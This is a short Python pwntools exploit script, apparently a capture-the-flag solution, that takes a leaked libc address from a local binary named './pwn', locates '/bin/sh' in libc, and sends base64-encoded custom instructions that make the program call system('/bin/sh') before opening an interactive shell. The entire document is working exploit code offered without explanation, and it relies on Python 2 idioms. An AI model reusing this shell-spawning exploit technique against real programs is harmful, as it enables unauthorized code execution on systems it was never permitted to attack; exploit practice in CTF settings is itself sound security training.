from pwn import *

class Instruction:
    def __init__(self, opcode, arg0, arg1):
        self.opcode = opcode
        self.arg0 = arg0
        self.arg1 = arg1
    def __str__(self):
        return "%s%s%s" % (
            p64(self.opcode),
            p64(self.arg0),
            p64(self.arg1),
        )

    def encode(self):
        return str(self).encode("base64")

io = process("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io.readuntil("gift:")
libc.address = int(io.readline().strip(), 16)
bin_sh_addr = next(libc.search("/bin/sh\x00"))
print("/bin/sh: %x" % (bin_sh_addr))

instructions = []
instructions.append(Instruction(0x10, 0, bin_sh_addr))
instructions.append(Instruction(0x40, u64("system\x00\x00"), 0))

payload = ""
for i in instructions:
    payload += str(i)

payload = payload.encode("base64").replace("\n", "")

print(payload)

io.sendline(payload)
io.interactive()
